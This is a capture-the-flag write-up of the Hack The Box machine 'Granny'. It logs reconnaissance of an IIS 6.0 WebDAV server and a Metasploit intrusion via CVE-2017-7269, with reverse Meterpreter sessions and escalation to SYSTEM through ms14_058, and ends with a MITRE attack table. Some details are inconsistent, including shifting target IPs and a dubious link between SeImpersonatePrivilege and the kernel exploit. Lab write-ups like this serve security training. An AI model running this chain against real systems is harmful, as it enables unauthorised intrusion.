# Granny

![image.png](image.png)

# Context

Lab link: [https://app.hackthebox.com/machines/Granny](https://app.hackthebox.com/machines/Granny)

# Scenario

Granny, while similar to Grandpa, can be exploited using several different methods. The intended method of solving this machine is the widely-known Webdav upload vulnerability.

# Questions

Q1- How many TCP ports are open on Granny?

Answer: 1

Reason: A full TCP sweep with `nmap -sC -sV -p- granny.htb -v -oN nmap.txt` found only `80/tcp` open, running `Microsoft-IIS/6.0`. WebDAV is enabled, with risky methods allowed including `PUT`, `DELETE`, `COPY`, `MOVE`, `MKCOL`, `PROPFIND`, and `PROPPATCH` - a strong early signal toward the intended WebDAV upload path.

```bash
$ nmap -sC -sV -p- granny.htb -v -oN nmap.txt            
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-26 10:27 -0500

Scanning granny.htb (10.129.95.234) [65535 ports]
Discovered open port 80/tcp on 10.129.95.234

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-title: Under Construction
|_http-server-header: Microsoft-IIS/6.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT POST
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   WebDAV type: Unknown
|   Server Type: Microsoft-IIS/6.0
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  Server Date: Thu, 26 Nov 2026 15:27:34 GMT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Q2- What is the name of the `nmap` script that identifies the allowed HTTP methods on Granny?

Answer: `http-webdav-scan`

Reason: During the initial `nmap -sC -sV -p- granny.htb` scan, the `http-webdav-scan` script enumerated the allowed HTTP methods on `80/tcp`, confirming WebDAV support with methods like `PUT`, `MKCOL`, `PROPFIND`, and `LOCK`/`UNLOCK` available on the IIS 6.0 server.

```bash

| http-webdav-scan:
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   WebDAV type: Unknown
|   Server Type: Microsoft-IIS/6.0
```

Q3- Which DOTNET-based web application framework is running on the target web server?

Answer: `ASP.NET`

Reason: A `curl -skI <http://granny.htb`> request revealed the `X-Powered-By: ASP.NET` header, confirming the IIS 6.0 server is running `ASP.NET` alongside WebDAV.

```bash
$ curl -skI http://granny.htb
HTTP/1.1 200 OK
Content-Length: 1433
Content-Type: text/html
Content-Location: http://granny.htb/iisstart.htm
Last-Modified: Fri, 21 Feb 2003 15:48:30 GMT
Accept-Ranges: bytes
ETag: "05b3daec0d9c21:39e"
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Date: Thu, 26 Nov 2026 15:31:26 GMT
```

Q4- Which HTTP method can be used to upload files onto Granny?

Answer: `PUT`

Reason: The `nmap` `http-webdav-scan` and `http-methods` scripts both listed `PUT` among the allowed methods on `http://granny.htb`, indicating WebDAV accepts file uploads via a direct `PUT` request to the server.

Q5- What is the 2017 CVE ID for a vulnerability that takes advantage of this IIS version and WebDAV, resulting in remote code execution?

Answer: CVE-2017-7269

Reason: `CVE-2017-7269` is a buffer overflow in the `ScStoragePathFromUrl` function of the IIS 6.0 WebDAV service, triggered by a malformed `PROPFIND` request with an oversized `If:` header. It allows unauthenticated remote code execution and is the same vulnerability previously exploited on the `Grandpa` box, matching the hint that Granny closely resembles it.

Q6- Which Metasploit reconnaissance module can be used to list possible privilege escalation paths on a compromised system?

Answer: `local_exploit_suggester`

Reason: The `post/multi/recon/local_exploit_suggester` module runs against an active Meterpreter session and checks it against known local privilege escalation modules, reporting which ones are likely applicable to the compromised host's OS and patch level.

Q7- User flag

Answer: [REDACTED]

Reason: `ms14_058_track_popup_menu` succeeded directly where `ms16_075_reflection` failed across two attempts, elevating the session from `nt authority\network service` straight to `nt authority\system`, bypassing the need for a separate low-privilege user foothold. The flag was read from `Lakis\Desktop\user.txt`.

```bash
msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set RHOSTS granny.htb
RHOSTS => granny.htb
msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set LHOST tun0
LHOST => 10.10.17.7
msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > run
[*] Started reverse TCP handler on 10.10.17.7:4444 
[*] Trying path length 3 to 60 ...
[*] Sending stage (207034 bytes) to 10.129.95.234
[*] Meterpreter session 1 opened (10.10.17.7:4444 -> 10.129.95.234:1031) at 2026-11-26 10:37:00 -0500

meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System
 272   4     smss.exe
 320   272   csrss.exe
 344   272   winlogon.exe
 392   344   services.exe
 404   344   lsass.exe
[...]
 1928  600   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 2308  600   wmiprvse.exe
 2344  1520  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 2412  600   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 3216  2344  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe

meterpreter > migrate 1928
[*] Migrating from 3216 to 1928...                                                                                                    
[*] Migration completed successfully.     

C:\Documents and Settings>whoami
whoami
nt authority\network service

msf post(multi/recon/local_exploit_suggester) > run
[*] 10.129.137.188 - Collecting local exploits for x86/windows...
[*] 10.129.137.188 - 268 exploit checks are being tried...
[+] 10.129.137.188 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated. Version Windows Server 2003 detected but not confirmed vulnerable
[+] 10.129.137.188 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. Revision 3959 appears vulnerable
[+] 10.129.137.188 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable. Revision 3959 appears vulnerable
[+] 10.129.137.188 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. Revision 3959 appears vulnerable
[+] 10.129.137.188 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated. 32-bit target detected
[+] 10.129.137.188 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable. Target appears vulnerable
[+] 10.129.137.188 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable. Revision 3959 appears vulnerable
[+] 10.129.137.188 - exploit/windows/persistence/bits: The target is vulnerable. Likely exploitable
[+] 10.129.137.188 - exploit/windows/persistence/registry_userinit: The target is vulnerable. Registry likely exploitable
[+] 10.129.137.188 - exploit/windows/persistence/userinit_mpr_logon_script: The target is vulnerable. Registry path is writable
[*] Running check method for exploit 66 / 66
[*] 10.129.137.188 - Valid modules for session 2:
============================

 #   Name                                                              Potentially Vulnerable?  Check Result
 -   ----                                                              -----------------------  ------------
 1   exploit/windows/local/ms10_015_kitrap0d                           Yes                      The service is running, but could not be validated. Version Windows Server 2003 detected but not confirmed vulnerable
 2   exploit/windows/local/ms14_058_track_popup_menu                   Yes                      The target appears to be vulnerable. Revision 3959 appears vulnerable
 3   exploit/windows/local/ms14_070_tcpip_ioctl                        Yes                      The target appears to be vulnerable. Revision 3959 appears vulnerable
 4   exploit/windows/local/ms15_051_client_copy_image                  Yes                      The target appears to be vulnerable. Revision 3959 appears vulnerable
 5   exploit/windows/local/ms16_016_webdav                             Yes                      The service is running, but could not be validated. 32-bit target detected
 6   exploit/windows/local/ms16_075_reflection                         Yes                      The target appears to be vulnerable. Target appears vulnerable
 7   exploit/windows/local/ppr_flatten_rec                             Yes                      The target appears to be vulnerable. Revision 3959 appears vulnerable
 8   exploit/windows/persistence/bits                                  Yes                      The target is vulnerable. Likely exploitable
 9   exploit/windows/persistence/registry_userinit                     Yes                      The target is vulnerable. Registry likely exploitable
 10  exploit/windows/persistence/userinit_mpr_logon_script             Yes                      The target is vulnerable. Registry path is writable

msf exploit(windows/local/ms14_058_track_popup_menu) > run
[*] Started reverse TCP handler on 10.10.17.7:4449 
[*] Reflectively injecting the exploit DLL and triggering the exploit...
[*] Launching netsh to host the DLL...
[+] Process 1680 launched.
[*] Reflectively injecting the DLL into 1680...
[*] Sending stage (207034 bytes) to 10.129.137.188
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Meterpreter session 4 opened (10.10.17.7:4449 -> 10.129.137.188:1043) at 2026-11-26 12:25:37 -0500

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM\

C:\Documents and Settings>type Lakis\Desktop\user.txt
type Lakis\Desktop\user.txt
```

Q8- Root flag

Answer: [REDACTED]

Reason: Since `ms14_058_track_popup_menu` escalated directly to `nt authority\system`, the root flag was accessible immediately from the same shell with no additional privilege escalation required.

```bash
C:\Documents and Settings>type Administrator\Desktop\root.txt
type Administrator\Desktop\root.txt
```

# Attack Chain

| Stage | Detail | MITRE |
| --- | --- | --- |
| Reconnaissance | Full TCP port sweep found only 80/tcp open, Microsoft-IIS/6.0 with ASP.NET, WebDAV enabled (PUT, PROPFIND, MKCOL allowed) | T1595 |
| Initial Access | Exploited CVE-2017-7269 (IIS6 WebDAV ScStoragePathFromUrl buffer overflow) via `exploit/windows/iis/iis_webdav_scstoragepathfromurl`, landing a session as `nt authority\network service` | T1190 |
| Discovery | Enumerated running processes with ps, identifying the fragile exploited `w3wp.exe` worker process versus stable long-lived services | T1057 |
| Defense Evasion / Stabilization | Migrated Meterpreter session from the unstable exploited process into `wmiprvse.exe` (PID 1928), avoiding the crash seen when migrating out of `w3wp.exe` directly | T1055 |
| Privilege Escalation (Recon) | Ran `post/multi/recon/local_exploit_suggester`, identifying `ms14_058_track_popup_menu` among several viable local kernel exploits | T1068 |
| Privilege Escalation | Exploited `ms14_058_track_popup_menu` (`win32k.sys` TrackPopupMenu vulnerability), escalating directly from network service to `nt authority\system` | T1068 |
| Collection | Read `user.txt` from `Lakis\Desktop\` and `root.txt` from `Administrator\Desktop\`, both accessible post-escalation under the SYSTEM context | T1005 |

## Attack Tree

```bash
HTB Granny (granny.htb)
│
├── 80/tcp -- IIS 6.0 + WebDAV (CVE-2017-7269)
│   └── exploit/windows/iis/iis_webdav_scstoragepathfromurl
│       └── shell as NT AUTHORITY\NETWORK SERVICE
│           │
│           ├── migrate 1928 (wmiprvse.exe) -- stabilize session
│           │   └── local_exploit_suggester
│           │       └── ms14_058_track_popup_menu
│           │           └── shell as NT AUTHORITY\SYSTEM
│           │               │
│           │               ├── Lakis\Desktop\user.txt
│           │               │   └── [USER FLAG]
│           │               │
│           │               └── Administrator\Desktop\root.txt
│           │                   └── [ROOT FLAG]
```

# Artifacts

| Category | Type | Value |
| --- | --- | --- |
| Discovery | Target | `granny.htb` |
|  | Open port | `80/tcp` |
|  | Service | Microsoft-IIS/6.0 |
|  | Framework | X-Powered-By: ASP.NET |
| Exploitation | CVE | CVE-2017-7269 |
|  | Module | `exploit/windows/iis/iis_webdav_scstoragepathfromurl` |
|  | Initial shell | `nt authority\network service` |
| Host Indicators | Exploited process | `w3wp.exe` (unstable) |
|  | Migration target | `wmiprvse.exe` (PID 1928) |
| Privilege Escalation | Enabling privilege | `SeImpersonatePrivilege` |
|  | Failed attempt | `ms16_075_reflection` (inconsistent, no escalation) |
|  | Successful module | `ms14_058_track_popup_menu` |
|  | Final context | `nt authority\system` |
| Flags | User flag | [REDACTED] (`Lakis\Desktop\user.txt`) |
|  | Root flag | [REDACTED] (`Administrator\Desktop\root.txt`) |

# Lab Insights

1. Legacy WebDAV/IIS deployments remain a durable attack surface years after patches exist, because end-of-life systems are frequently left unpatched in production or lab environments precisely because they can no longer receive vendor updates. The `CVE-2017-7269` buffer overflow in IIS 6.0's `ScStoragePathFromUrl` function allowed full remote code execution from a single exposed `80/tcp` port, with no authentication required (T1190).
2. Service-account privileges like `SeImpersonatePrivilege` are often treated as low-risk defaults, but they represent a direct path to full system compromise when combined with known token-impersonation or kernel exploitation techniques. On Granny, `nt authority\network service` held `SeImpersonatePrivilege` by default, which `ms14_058_track_popup_menu` leveraged to escalate straight to `nt authority\system`, with no intermediate user account required (T1068).
3. Post-exploitation session stability directly affects the reliability of an entire engagement, since early-generation exploit shellcode and fragile host processes (like `w3wp.exe`) can crash under routine actions like process migration. Deliberately migrating into a stable, long-lived process (`wmiprvse.exe`) before further privilege escalation attempts preserved access and prevented repeated loss of foothold (T1055).